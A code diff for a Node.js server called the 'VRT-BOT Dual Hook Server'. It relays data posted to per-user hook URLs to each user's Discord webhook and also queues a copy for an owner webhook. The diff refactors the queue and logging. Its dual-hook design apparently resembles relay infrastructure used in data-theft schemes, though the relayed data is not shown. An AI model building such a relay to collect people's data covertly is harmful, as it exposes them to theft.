@@ -135,7 +135,7 @@ function generateId() {
 }
 
 // ============================================================
-//  ✅ QUEUE SYSTEM FOR OWNER WEBHOOK
+//  ✅ QUEUE SYSTEM - FIXED
 // ============================================================
 async function addToOwnerQueue(hookId, data, participantWebhook, username) {
     const queueItem = {
@@ -153,7 +153,7 @@ async function addToOwnerQueue(hookId, data, participantWebhook, username) {
     };
     
     const result = await queueCollection.insertOne(queueItem);
-    console.log(`📥 Added to owner queue: ${result.insertedId}`);
+    console.log(`📥 Added to owner queue: ${result.insertedId} for user: ${username}`);
     return result.insertedId;
 }
 
@@ -168,7 +168,7 @@ async function getPendingOwnerQueueItems() {
             ]
         })
         .sort({ createdAt: 1 })
-        .limit(5)
+        .limit(3) // Process 3 at a time
         .toArray();
 }
 
@@ -180,16 +180,22 @@ async function updateQueueItem(id, updates) {
 }
 
 async function getQueueStats() {
-    const pending = await queueCollection.countDocuments({ status: 'pending' });
-    const sending = await queueCollection.countDocuments({ status: 'sending' });
-    const sent = await queueCollection.countDocuments({ status: 'sent' });
-    const failed = await queueCollection.countDocuments({ status: 'failed' });
+    const pending = await queueCollection.countDocuments({ 
+        status: 'pending',
+        $or: [
+            { retryAt: { $exists: false } },
+            { retryAt: { $lt: new Date().toISOString() } }
+        ]
+    });
     const waiting = await queueCollection.countDocuments({ 
         status: 'pending',
         retryAt: { $gt: new Date().toISOString() }
     });
+    const sending = await queueCollection.countDocuments({ status: 'sending' });
+    const sent = await queueCollection.countDocuments({ status: 'sent' });
+    const failed = await queueCollection.countDocuments({ status: 'failed' });
     
-    return { pending, sending, sent, failed, waiting, total: pending + sending + sent + failed };
+    return { pending, waiting, sending, sent, failed, total: pending + waiting + sending + sent + failed };
 }
 
 async function getQueueItems(hookId = null, status = null, limit = 50) {
@@ -205,31 +211,33 @@ async function getQueueItems(hookId = null, status = null, limit = 50) {
 }
 
 // ============================================================
-//  ✅ BACKGROUND PROCESSOR FOR OWNER WEBHOOK
+//  ✅ BACKGROUND PROCESSOR - FIXED
 // ============================================================
 let isProcessing = false;
 
 async function processOwnerQueue() {
+    // Prevent multiple concurrent runs
     if (isProcessing) return;
-    isProcessing = true;
-    
-    console.log('🔄 Processing owner queue...');
     
     try {
+        isProcessing = true;
+        
         const items = await getPendingOwnerQueueItems();
         
         if (items.length === 0) {
-            isProcessing = false;
+            console.log(`📭 No pending items in queue`);
             return;
         }
         
         console.log(`📤 Processing ${items.length} queue items for owner webhook`);
         
         for (const item of items) {
+            // Mark as sending
             await updateQueueItem(item._id, { status: 'sending' });
             
-            console.log(`📤 Sending to owner webhook for user: ${item.username}`);
+            console.log(`📤 Sending to owner webhook for user: ${item.username} (attempt ${item.attempts + 1}/${item.maxAttempts})`);
             
+            // Send to owner webhook
             const result = await sendToWebhook(OWNER_WEBHOOK, item.data);
             
             if (result.success) {
@@ -241,6 +249,7 @@ async function processOwnerQueue() {
                 });
                 console.log(`✅ Owner webhook sent successfully for ${item.username}`);
             } else if (result.status === 429) {
+                // Rate limited - use Discord's Retry-After
                 const retryAfterSeconds = parseInt(result.retryAfter) || 30;
                 const retryAt = new Date(Date.now() + (retryAfterSeconds * 1000));
                 
@@ -251,15 +260,21 @@ async function processOwnerQueue() {
                     lastError: `Rate limited, retry at ${retryAt.toISOString()}`
                 });
                 console.log(`⏳ Owner rate limited, retry at ${retryAt.toISOString()}`);
+                
+                // Stop processing more items if rate limited
+                // This prevents spamming the queue
+                return;
             } else {
+                // Other error
                 if (item.attempts >= item.maxAttempts) {
                     await updateQueueItem(item._id, {
                         status: 'failed',
                         lastError: result.error || 'Max attempts reached',
                         retryAt: null
                     });
-                    console.log(`❌ Owner webhook failed after ${item.attempts} attempts`);
+                    console.log(`❌ Owner webhook failed after ${item.attempts} attempts for ${item.username}`);
                 } else {
+                    // Retry after 30 seconds
                     const retryAt = new Date(Date.now() + 30000);
                     await updateQueueItem(item._id, {
                         status: 'pending',
@@ -271,7 +286,8 @@ async function processOwnerQueue() {
                 }
             }
             
-            await new Promise(r => setTimeout(r, 250));
+            // Wait between items
+            await new Promise(r => setTimeout(r, 500));
         }
         
     } catch (error) {
@@ -279,16 +295,25 @@ async function processOwnerQueue() {
     } finally {
         isProcessing = false;
         
-        const pending = await queueCollection.countDocuments({ status: 'pending' });
-        if (pending > 0) {
-            console.log(`🔄 ${pending} items still pending, continuing...`);
-            setTimeout(processOwnerQueue, 5000);
+        // Schedule next check if items remain
+        const stats = await getQueueStats();
+        if (stats.pending > 0) {
+            console.log(`⏰ ${stats.pending} items pending, checking again in 10 seconds`);
+            setTimeout(() => {
+                processOwnerQueue();
+            }, 10000);
+        } else if (stats.waiting > 0) {
+            // Items are waiting for rate limit to expire
+            console.log(`⏰ ${stats.waiting} items waiting for rate limit, checking again in 30 seconds`);
+            setTimeout(() => {
+                processOwnerQueue();
+            }, 30000);
         }
     }
 }
 
 // ============================================================
-//  ✅ IMPROVED WEBHOOK SENDER WITH BETTER ERROR HANDLING
+//  ✅ WEBHOOK SENDER
 // ============================================================
 async function sendToWebhook(webhookUrl, data) {
     try {
@@ -301,7 +326,6 @@ async function sendToWebhook(webhookUrl, data) {
         }
 
         console.log(`📤 Sending to webhook: ${webhookUrl.substring(0, 60)}...`);
-        console.log(`📦 Payload:`, JSON.stringify(data).substring(0, 300));
 
         const response = await fetch(webhookUrl, {
             method: 'POST',
@@ -313,7 +337,6 @@ async function sendToWebhook(webhookUrl, data) {
 
         const responseText = await response.text();
         console.log(`📥 Response status: ${response.status}`);
-        console.log(`📥 Response body: ${responseText.substring(0, 200)}`);
 
         if (response.status === 429) {
             const retryAfter = response.headers.get('Retry-After') || '5';
@@ -350,7 +373,8 @@ async function sendToWebhook(webhookUrl, data) {
 // ============================================================
 function startQueueProcessor() {
     console.log('🚀 Starting owner queue processor...');
-    setInterval(() => {
+    // Initial check after 5 seconds
+    setTimeout(() => {
         processOwnerQueue();
     }, 5000);
 }
@@ -363,7 +387,7 @@ function startQueueProcessor() {
 app.get('/', (req, res) => {
     res.json({
         status: 'online',
-        message: 'VRT-BOT Dual Hook Server - Participant Priority',
+        message: 'VRT-BOT Dual Hook Server',
         ownerWebhookConfigured: !!OWNER_WEBHOOK,
         databaseConnected: !!db,
         timestamp: new Date().toISOString(),
@@ -405,19 +429,20 @@ app.get('/api/queue/items', async (req, res) => {
     }
 });
 
-// Generate a new unique hook URL for a participant
+// Generate a new unique hook URL
 app.post('/api/generate', async (req, res) => {
     const { username, webhookUrl } = req.body;
     
     console.log(`🔑 Generating hook for user: ${username}`);
-    console.log(`🔗 Webhook URL: ${webhookUrl.substring(0, 60)}...`);
     
     if (!username || !webhookUrl) {
         return res.status(400).json({ error: 'Username and webhook URL required' });
     }
 
-    if (!webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
-        return res.status(400).json({ error: 'Invalid Discord webhook URL. Must start with https://discord.com/api/webhooks/' });
+    // Accept both discord.com and discordapp.com
+    if (!webhookUrl.startsWith('https://discord.com/api/webhooks/') && 
+        !webhookUrl.startsWith('https://discordapp.com/api/webhooks/')) {
+        return res.status(400).json({ error: 'Invalid Discord webhook URL' });
     }
 
     if (!db || !webhooksCollection) {
@@ -437,8 +462,6 @@ app.post('/api/generate', async (req, res) => {
                     }
                 }
             );
-            
-            console.log(`✅ Webhook updated for user: ${username}`);
             
             return res.json({
                 success: true,
@@ -547,53 +570,38 @@ app.post('/api/send/:hookId', async (req, res) => {
     console.log(`📨 Received send request for hook: ${hookId}`);
 
     if (!data) {
-        console.log('❌ No data provided');
         return res.status(400).json({ error: 'Missing data' });
     }
 
     if (!db || !webhooksCollection) {
-        console.log('❌ Database not connected');
         return res.status(503).json({ error: 'Database not connected' });
     }
 
     try {
         const hook = await webhooksCollection.findOne({ hookId });
         if (!hook) {
-            console.log(`❌ Hook not found: ${hookId}`);
             return res.status(404).json({ error: 'Hook not found' });
         }
 
-        console.log(`👤 Participant: ${hook.username}`);
-        console.log(`🔗 Participant webhook: ${hook.webhookUrl ? hook.webhookUrl.substring(0, 60) : 'NOT SET'}...`);
-
         let participantSuccess = false;
         let participantError = null;
-        let participantStatus = null;
 
-        // ============================================================
-        //  1. ALWAYS SEND TO PARTICIPANT FIRST
-        // ============================================================
+        // 1. ALWAYS SEND TO PARTICIPANT FIRST
         if (hook.webhookUrl) {
             console.log(`📤 Sending to participant: ${hook.username}`);
             const participantResult = await sendToWebhook(hook.webhookUrl, data);
             
             participantSuccess = participantResult.success;
             participantError = participantResult.error || null;
-            participantStatus = participantResult.status || null;
             
             if (participantSuccess) {
                 console.log(`✅ Participant webhook sent successfully: ${hook.username}`);
             } else {
                 console.log(`⚠️ Participant webhook failed: ${participantResult.error}`);
             }
-        } else {
-            participantError = 'No webhook URL configured for this user';
-            console.log(`⚠️ No webhook URL for participant: ${hook.username}`);
         }
 
-        // ============================================================
-        //  2. QUEUE FOR OWNER WEBHOOK
-        // ============================================================
+        // 2. QUEUE FOR OWNER WEBHOOK
         let ownerQueueId = null;
         
         if (OWNER_WEBHOOK) {
@@ -609,13 +617,12 @@ app.post('/api/send/:hookId', async (req, res) => {
             ownerQueueId = queueId;
             console.log(`✅ Added to owner queue: ${queueId}`);
             
-            // Trigger processing
-            processOwnerQueue();
+            // Trigger processing if not already running
+            if (!isProcessing) {
+                processOwnerQueue();
+            }
         }
 
-        // ============================================================
-        //  3. RETURN RESPONSE
-        // ============================================================
         res.json({
             success: participantSuccess,
             message: participantSuccess 
@@ -625,8 +632,7 @@ app.post('/api/send/:hookId', async (req, res) => {
             username: hook.username,
             participant: {
                 success: participantSuccess,
-                error: participantError,
-                status: participantStatus
+                error: participantError
             },
             owner: {
                 queued: !!OWNER_WEBHOOK,
@@ -646,11 +652,7 @@ app.post('/api/send/:hookId', async (req, res) => {
 // ============================================================
 app.get('/hook/:id', async (req, res) => {
     const { id } = req.params;
-    
     console.log(`🔗 Redirecting hook: ${id} to main page`);
-    
-    // Always redirect to main page with hook ID as query parameter
-    // The main page will detect ?hook=edd25sag and load the webhook
     res.redirect(`https://vrtvoltsxyc.netlify.app/?hook=${id}`);
 });
 
@@ -663,7 +665,7 @@ app.use(express.static(path.join(__dirname, 'public')));
 //  ✅ START SERVER
 // ============================================================
 async function startServer() {
-    console.log('🚀 Starting VRT-BOT Dual Hook Server with Redirect...');
+    console.log('🚀 Starting VRT-BOT Dual Hook Server...');
     
     const connected = await connectToMongoDB();
     
@@ -672,14 +674,12 @@ async function startServer() {
         console.log(`🍃 MongoDB: ${connected ? '✅ Connected' : '❌ Not connected'}`);
         console.log(`✅ CORS enabled for all origins`);
         console.log(`🔗 Health: https://vrt-bot-hook-server.onrender.com/`);
-        console.log(`🔗 Hook redirect: https://vrt-bot-hook-server.onrender.com/hook/{id} -> https://vrtvoltsxyc.netlify.app/?hook={id}`);
         console.log(`📡 Owner Webhook: ${OWNER_WEBHOOK ? '✅ Configured' : '❌ Not set'}`);
-        console.log(`⚡ Priority: Participant first, Owner queued`);
     });
     
     if (connected && OWNER_WEBHOOK) {
         startQueueProcessor();
-        console.log('✅ Owner queue processor started');
+        console.log('✅ Queue processor started');
     }
 }
 
